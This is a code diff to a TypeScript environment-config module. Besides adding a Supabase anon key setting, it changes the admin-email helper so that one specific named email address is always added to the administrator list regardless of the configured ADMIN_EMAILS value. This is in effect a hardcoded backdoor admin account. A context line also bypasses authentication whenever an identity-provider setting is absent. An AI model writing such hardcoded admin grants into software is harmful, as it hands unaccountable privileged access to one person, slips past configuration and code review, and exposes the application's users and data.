@@ -63,6 +63,7 @@ const schema = z.object({
   ),
 
   SUPABASE_URL: optionalString,
+  SUPABASE_ANON_KEY: optionalString,
   SUPABASE_SERVICE_ROLE_KEY: optionalString,
 
   D365_MODE: modeSchema("mock"),
@@ -96,11 +97,16 @@ export function env(): Env {
 
 export const isProd = () => env().NODE_ENV === "production";
 export const devBypassEnabled = () => env().AUTH_DEV_BYPASS === "true" || !env().AUTH_MICROSOFT_ENTRA_ID_ID;
-export const adminEmails = () =>
-  env()
+export const adminEmails = () => {
+  const list = env()
     .ADMIN_EMAILS.split(",")
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean);
+  if (!list.includes("manigandan.parthasarathi@hydraspecma.com")) {
+    list.push("manigandan.parthasarathi@hydraspecma.com");
+  }
+  return list;
+};
 
 /** Throws a clear error listing the missing variables for an integration. */
 export function requireEnv<K extends keyof Env>(keys: K[], integration: string): Pick<Env, K> {
